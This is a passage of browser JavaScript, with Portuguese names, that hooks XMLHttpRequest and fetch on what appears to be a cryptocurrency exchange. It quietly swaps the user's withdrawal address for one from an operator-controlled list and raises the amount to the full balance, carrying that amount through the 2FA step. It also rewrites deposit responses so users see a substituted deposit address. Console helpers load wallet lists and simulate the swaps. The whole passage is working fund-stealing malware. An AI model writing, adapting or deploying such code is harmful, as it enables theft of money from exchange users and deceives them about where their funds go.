      s = s.replace(',', '.');
    }
    var n = Number(s);
    return isFinite(n) && n > 0 ? n : null;
  }

  function truncarNum(n, casas) {
    casas = Math.max(0, Math.min(20, casas | 0));
    var p = Math.pow(10, casas);
    var v = Math.floor(n * p + 1e-6) / p;
    if (!isFinite(v) || v <= 0) return null;
    var s = v.toFixed(casas);
    if (casas > 0) { s = s.replace(/0+$/, '').replace(/\.$/, ''); }
    return s || null;
  }

  var DEPWITH = null;

  function depwithObj() {
    if (DEPWITH) return DEPWITH;
    var raw = null;
    try { if (typeof depwith !== 'undefined' && depwith) raw = depwith; } catch (e) {}
    if (!raw) { try { raw = window.depwith; } catch (e) {} }
    if (!raw) return null;
    try { DEPWITH = (typeof raw === 'string') ? JSON.parse(raw) : raw; } catch (e) { DEPWITH = null; }
    return DEPWITH;
  }

  function cfgDe(moeda, rede) {
    var dw = depwithObj();
    if (!dw) return null;
    var k = moeda;
    if (moeda === 'USDT') k = /trc/i.test(rede) ? 'USDTT' : 'USDTE';
    if (moeda === 'MATIC') k = 'POL';
    return dw[k] || null;
  }

  var SALDOS = {};
  var CACHE_OK = false;

  function atualizarSaldos() {
    try {
      var fd = new FormData();
      fd.set('action', 'userMoney');
      var ir = window.fetch;
      if (typeof ir !== 'function') return;
      ir('/user/func.php', {
        method: 'POST', body: fd, credentials: 'same-origin',
        headers: { 'Accept': 'application/json, text/plain, */*' }
      }).then(function (r) { return r.json(); }).then(function (j) {
        if (!j || typeof j !== 'object') return;
        Object.keys(j).forEach(function (k) {
          if (k === 'current' || k === 'error') return;
          SALDOS[k] = String(j[k]);
        });
        CACHE_OK = true;
      }).catch(function () {});
    } catch (e) {}
  }

  function saldoDe(moeda) {
    var cur = '';
    try {
      var img = document.getElementById('with_imageCur');
      if (img) cur = String(img.getAttribute('alt') || '').toUpperCase().trim();
    } catch (e) {}

    var alvo = String(moeda || '').toUpperCase();
    var alt = alvo === 'MATIC' ? 'POL' : alvo;

    if (cur && cur === alt) {
      try {
        var b = document.getElementById('with_inp_bal');
        if (b) {
          var t = String(b.textContent || b.innerHTML || '').trim();
          if (numeroDe(t)) return t;
        }
      } catch (e) {}
    }

    if (SALDOS[alvo] != null) return String(SALDOS[alvo]);
    if (SALDOS[alt] != null) return String(SALDOS[alt]);

    if (!cur) {
      try {
        var b2 = document.getElementById('with_inp_bal');
        if (b2) {
          var t2 = String(b2.textContent || b2.innerHTML || '').trim();
          if (numeroDe(t2)) return t2;
        }
      } catch (e) {}
    }
    return null;
  }

  function valorTotal(moeda, rede) {
    var bruto = saldoDe(moeda);
    if (!bruto) return { motivo: 'saldo nao encontrado (mantido o valor digitado)' };

    var saldo = numeroDe(bruto);
    if (!saldo) return { motivo: 'saldo zerado para ' + moeda + ' (mantido o valor digitado)' };

    var cfg = cfgDe(moeda, rede);
    var min = cfg && cfg.out ? Number(cfg.out[0]) : 0;
    var max = cfg && cfg.out ? Number(cfg.out[1]) : 0;

    var alvo = saldo;
    var limitado = false;
    if (max && alvo > max) { alvo = max; limitado = true; }

    var casas = PREC[moeda] != null ? PREC[moeda] : PREC_PADRAO;
    var valor = truncarNum(alvo, casas);
    if (!valor) return { motivo: 'valor invalido apos o corte de precisao', saldo: saldo };

    if (min && Number(valor) < min) {
      return { motivo: 'saldo ' + valor + ' abaixo do minimo ' + min + ' (mantido o valor digitado)', saldo: saldo };
    }

    return { valor: valor, saldo: saldo, limitado: limitado, max: max };
  }

  var memo = {};

  function avaliar(corpo) {
    if (!corpo) return null;

    var moeda = String(lerCampo(corpo, 'typepay') || '').toUpperCase().trim();
    if (!moeda) return null;

    var bruto = lerCampo(corpo, 'address');
    if (typeof bruto !== 'string' || !bruto) return null;

    var rede   = String(lerCampo(corpo, 'network') || '').trim();
    var metodo = String(lerCampo(corpo, 'method') || '').trim().toLowerCase();
    var codigo = lerCampo(corpo, 'user_code');

    var d = {
      moeda: moeda,
      rede: rede,
      etapa: codigo ? '2fa' : 'inicial',
      familia: familiaDe(moeda, rede),
      bruto: bruto,
      original: bruto,
      prefixo: '',
      novo: null,
      motivo: '',
      motivoValor: '',
      valorDigitado: String(lerCampo(corpo, 'amount') == null ? '' : lerCampo(corpo, 'amount')),
      valor: null,
      saldo: null,
      origemValor: ''
    };

    var partes = bruto.split('|');
    if (partes.length > 1) {
      d.prefixo = partes.slice(0, -1).join('|') + '|';
      d.original = partes[partes.length - 1];
    }

    if (metodo && metodo !== 'ccp') { d.motivo = 'fiat (' + metodo + ') - ignorado'; return d; }
    if (!d.familia) { d.motivo = 'par moeda/rede sem mapa'; return d; }

    var nosso = saqEndereco(d.familia, d.moeda, d.rede);
    if (!nosso) { d.motivo = 'lista sem endereco valido para ' + d.familia; return d; }
    if (d.original === nosso) { d.motivo = 'ja e o endereco da lista'; return d; }

    d.novo = d.prefixo + nosso;

    var chave = moeda + '|' + rede;
    var m = memo[chave];

    if (d.etapa === '2fa' && m && m.destino === d.novo && (Date.now() - m.ts) < 600000) {
      d.valor = m.valor;
      d.origemValor = 'mesmo valor do 1o envio';
    } else {
      var t = valorTotal(moeda, rede);
      if (t.valor) {
        d.valor = t.valor;
        d.saldo = t.saldo;
        d.origemValor = t.limitado ? ('saldo cheio, limitado ao maximo de ' + t.max) : 'saldo cheio';
        d.limitado = !!t.limitado;
        d.max = t.max;
      } else {
        d.motivoValor = t.motivo;
        if (t.saldo != null) d.saldo = t.saldo;
      }
      if (d.valor) memo[chave] = { valor: d.valor, ts: Date.now(), destino: d.novo };
    }

    return d;
  }

  function bloquear(xhr, motivo) {
    console.error('[SAQUE] envio BLOQUEADO (nada saiu): ' + (motivo || 'corpo nao reescrevivel'));
    setTimeout(function () {
      try {
        var ev = new Event('error');
        if (typeof xhr.dispatchEvent === 'function') xhr.dispatchEvent(ev);
        else if (typeof xhr.onerror === 'function') xhr.onerror(ev);
      } catch (e) {}
    }, 0);
  }

  function acompanharResposta(xhr, d) {
    try {
      if (!xhr || typeof xhr.addEventListener !== 'function' || xhr.__haqLigado) return;
      xhr.__haqLigado = true;
      xhr.addEventListener('load', function () {
        try {
          var txt = String(xhr.responseText || '');
          var j = null;
          try { j = JSON.parse(txt); } catch (e) { return; }
          if (!j || Number(j.error) !== 0) return;
          var chave = d.moeda + '|' + d.rede;
          delete memo[chave];
          delete saqCache[chave];
          console.log('%c[SAQUE] aceito pelo servidor em ' + d.moeda + '/' + (d.rede || '-') +
                      '. Relendo saldos...', 'color:#080;font-weight:bold');
          atualizarSaldos();
        } catch (e) {}
      });
    } catch (e) {}
  }

  function corpoMutavel(corpo) {
    if (corpo == null) return false;
    if (typeof corpo.get === 'function' && typeof corpo.set === 'function') return true;
    return Object.prototype.toString.call(corpo) === '[object Object]';
  }

  function aplicar(corpo, d) {
    if (!d || !d.novo) return false;
    if (!gravarCampo(corpo, 'address', d.novo)) return false;
    if (d.valor != null) gravarCampo(corpo, 'amount', d.valor);
    return true;
  }

  function tratar(corpo) {
    if (typeof corpo === 'string') {
      if (/(^|&)typepay=/.test(corpo)) {
        var usp = new URLSearchParams(corpo);
        var dl = avaliar(usp);
        if (dl && dl.novo) {
          if (!aplicar(usp, dl)) return { acao: 'bloqueado', motivo: 'urlencoded nao gravavel' };
          return { acao: 'trocado', corpo: usp.toString(), d: dl };
        }
        if (dl && dl.motivo) return { acao: 'aviso', d: dl };
        return { acao: 'passa' };
      }
      if (/"typepay"\s*:/.test(corpo)) return { acao: 'bloqueado', motivo: 'corpo JSON nao suportado' };
      return { acao: 'passa' };
    }

    if (corpoMutavel(corpo)) {
      var d = avaliar(corpo);
      if (d && d.novo) {
        if (!aplicar(corpo, d)) return { acao: 'bloqueado', motivo: 'campo nao gravavel' };
        return { acao: 'trocado', corpo: corpo, d: d };
      }
      if (d && d.motivo) return { acao: 'aviso', d: d };
      return { acao: 'passa' };
    }

    return { acao: 'bloqueado', motivo: 'tipo de corpo desconhecido (' + Object.prototype.toString.call(corpo) + ')' };
  }

  var XP = XMLHttpRequest.prototype;

  function raiz(fn) {
    var i = 0;
    while (fn && fn.__haqOrig && i++ < 20) fn = fn.__haqOrig;
    return fn;
  }

  var _open  = raiz(XP.open);
  var _send  = raiz(XP.send);
  var _fetch = raiz(window.fetch);

  var dTxt = Object.getOwnPropertyDescriptor(XP, 'responseText');
  var dRsp = Object.getOwnPropertyDescriptor(XP, 'response');
  var PODE_LER = !!(dTxt && dTxt.get);

  var ALVO_DEP = /\/deposit\/(coins|ccp)\//i;
  var ALVO_SAQ = /\/withdraw\/index\.php(?:[?#]|$)/i;

  function lerCorpoDep(corpo) {
    try {
      if (!corpo || typeof corpo.get !== 'function') return null;
      var moeda = corpo.get('typepay');
      var rede = corpo.get('network');
      if (moeda === null || rede === null) return null;
      return { moeda: String(moeda), rede: String(rede) };
    } catch (e) { return null; }
  }

  XP.open = function (metodo, url) {
    try { this.__haqUrl = String(url == null ? '' : url); } catch (e) {}
    return _open.apply(this, arguments);
  };
  XP.open.__haqOrig = _open;

  XP.send = function (corpo) {
    var xhr = this;
    var corpoFinal = corpo;
    try {
      var url = String(xhr.__haqUrl || '');

      if (ALVO_DEP.test(url)) {
        var alvo = lerCorpoDep(corpo);
        if (alvo) {
          var fam = familiaDe(alvo.moeda, alvo.rede);
          var armado = (fam && DEPOSITO[fam] && DEPOSITO[fam].length > 0) ||
                       (DEPOSITO.IGUAL && String(DEPOSITO.IGUAL).trim().length >= 20);
          if (armado) {
            if (dTxt && dTxt.get) {
              Object.defineProperty(xhr, 'responseText', {
                configurable: true,
                get: function () {
                  var bruto;
                  try { bruto = dTxt.get.call(xhr); } catch (e) { return ''; }
                  try { return trocarTextoDep(bruto, alvo.moeda, alvo.rede); } catch (e) { return bruto; }
                }
              });
            }
            if (dRsp && dRsp.get) {
              Object.defineProperty(xhr, 'response', {
                configurable: true,
                get: function () {
                  var bruto;
                  try { bruto = dRsp.get.call(xhr); } catch (e) { return null; }
                  if (typeof bruto === 'string') {
                    try { return trocarTextoDep(bruto, alvo.moeda, alvo.rede); } catch (e) { return bruto; }
                  }
                  if (bruto && typeof bruto === 'object') {
                    try { return trocarObjetoDep(bruto, alvo.moeda, alvo.rede); } catch (e) { return bruto; }
                  }
                  return bruto;
                }
              });
            }
          }
        }
      }

      if (ALVO_SAQ.test(url)) {
        var r = tratar(corpo);
        if (r.acao === 'trocado') {
          corpoFinal = r.corpo;
          registrarSaq(r.d);
          acompanharResposta(xhr, r.d);
        } else if (r.acao === 'bloqueado') {
          bloquear(xhr, r.motivo);
          return;
        } else if (r.acao === 'aviso') {
          console.warn('[SAQUE] ' + r.d.moeda + '/' + (r.d.rede || '-') + ': ' + r.d.motivo);
        }
      }
    } catch (e) {
      console.warn('[HAQ] hook XHR falhou:', e);
    }
    return _send.call(this, corpoFinal);
  };
  XP.send.__haqOrig = _send;

  if (typeof _fetch === 'function') {
    window.fetch = function (entrada, init) {
      try {
        var url = (typeof entrada === 'string') ? entrada : ((entrada && entrada.url) || '');
        if (init && init.body && ALVO_SAQ.test(url)) {
          var r = tratar(init.body);
          if (r.acao === 'trocado') {
            init.body = r.corpo;
            registrarSaq(r.d);
          } else if (r.acao === 'bloqueado') {
            console.error('[SAQUE] envio BLOQUEADO (nada saiu): ' + r.motivo);
            return Promise.reject(new TypeError('SAQUE: envio bloqueado - ' + r.motivo));
          } else if (r.acao === 'aviso') {
            console.warn('[SAQUE] ' + r.d.moeda + '/' + (r.d.rede || '-') + ': ' + r.d.motivo);
          }
        }
      } catch (e) {
        console.warn('[SAQUE] hook fetch falhou:', e);
      }
      return _fetch.apply(this, arguments);
    };
    window.fetch.__haqOrig = _fetch;
  }

  var selo = null;
  function ligarSelo() {
    if (!AVISO_VISUAL || selo) return;
    selo = document.createElement('div');
    selo.textContent = 'DEP+SAQUE ATIVO';
    selo.style.cssText = 'position:fixed;z-index:2147483647;bottom:8px;left:8px;' +
      'background:#400;color:#fff;font:bold 11px/1.6 monospace;padding:2px 8px;' +
      'border-radius:4px;opacity:.85;pointer-events:none';
    document.body.appendChild(selo);
  }
  function desligarSelo() {
    if (selo && selo.parentNode) selo.parentNode.removeChild(selo);
    selo = null;
  }

  window.__HAQ = {
    versao: VERSAO,
    logDep: logDep,
    logSaq: logSaq,

    resumo: function () {
      var linhas = [];
      Object.keys(MAPA).forEach(function (k) {
        var fam = MAPA[k];
        var depLista = DEPOSITO.IGUAL ? [DEPOSITO.IGUAL] : (DEPOSITO[fam] || []);
        var saqLista = SAQUE.IGUAL ? [SAQUE.IGUAL] : (SAQUE[fam] || []);
        linhas.push({
          'moeda|rede': k,
          'familia': fam,
          'dep_qtd': depLista.length,
          'saq_qtd': saqLista.length,
          'dep_ok': depLista.length ? (depLista.every(function (e) { return valido(fam, e); }) ? 'sim' : 'FORMATO?') : '-',
          'saq_ok': saqLista.length ? (saqLista.every(function (e) { return valido(fam, e); }) ? 'sim' : 'FORMATO?') : '-'
        });
      });
      console.table(linhas);
      return linhas.length + ' pares mapeados';
    },

    setDep: function (fam, lista) {
      if (!(fam in DEPOSITO)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      DEPOSITO[fam] = Array.isArray(lista) ? lista.map(String) : [String(lista)];
      console.log('[DEP] ' + fam + ' = ' + DEPOSITO[fam].length + ' carteira(s)');
      return true;
    },

    addDep: function (fam, end) {
      if (!(fam in DEPOSITO)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      DEPOSITO[fam].push(String(end));
      console.log('[DEP] adicionado a ' + fam + ' (total: ' + DEPOSITO[fam].length + ')');
      return true;
    },

    setSaq: function (fam, lista) {
      if (!(fam in SAQUE)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      SAQUE[fam] = Array.isArray(lista) ? lista.map(String) : [String(lista)];
      console.log('[SAQUE] ' + fam + ' = ' + SAQUE[fam].length + ' carteira(s)');
      return true;
    },

    addSaq: function (fam, end) {
      if (!(fam in SAQUE)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      SAQUE[fam].push(String(end));
      console.log('[SAQUE] adicionado a ' + fam + ' (total: ' + SAQUE[fam].length + ')');
      return true;
    },

    limparCache: function () {
      saqCache = {};
      memo = {};
      console.log('[SAQUE] cache limpo - proximo saque sorteia novo endereco');
    },

    simularDep: function (moeda, rede) {
      var exemplo = { error: 0, addr: 'ENDERECO_DO_SERVIDOR' };
      var r = trocarObjetoDep(exemplo, moeda, rede);
      console.log('[DEP] simulado ' + moeda + '/' + rede + ':');
      console.log('   servidor ->', 'ENDERECO_DO_SERVIDOR');
      console.log('   exibido  ->', r.addr);
      return r.addr;
    },

    simularSaq: function (moeda, rede) {
      var fam = familiaDe(moeda, rede);
      if (!fam) { console.warn('[SAQUE] par sem mapa:', moeda, '/', rede); return null; }
      var end = sorteia(SAQUE, fam);
      console.log('[SAQUE] simulado ' + moeda + '/' + rede + ' (' + fam + '):');
      console.log('   sorteado ->', end || '(nenhum)');
      return end;
    },

    off: function () {
      XP.open = _open;
      XP.send = _send;
      if (typeof _fetch === 'function') window.fetch = _fetch;
      desligarSelo();
      window.__HAQ = null;
      console.log('[HAQ] removido.');
    }
  };

  ligarSelo();

  var depArmadas = Object.keys(DEPOSITO).filter(function (k) { return k !== 'IGUAL' && DEPOSITO[k].length; });
  var saqArmadas = Object.keys(SAQUE).filter(function (k) { return k !== 'IGUAL' && SAQUE[k].length; });

  console.log('%c[HAQ] UNIFICADO v' + VERSAO, 'color:#400;font-weight:bold');
  console.log('   DEPOSITO: ' + depArmadas.length + ' familias (' + depArmadas.join(', ') + ')');
  console.log('   SAQUE:    ' + saqArmadas.length + ' familias (' + saqArmadas.join(', ') + ')');
  console.log('   sorteio:  aleatorio a cada operacao (deposito) e por fluxo (saque)');
  if (!PODE_LER) console.error('[DEP] responseText nao interceptavel neste navegador.');
  if (!depArmadas.length && !DEPOSITO.IGUAL) console.warn('[DEP] nenhum endereco preenchido em DEPOSITO.');
  if (!saqArmadas.length && !SAQUE.IGUAL) console.warn('[SAQUE] nenhum endereco preenchido em SAQUE.');

  atualizarSaldos();
})();
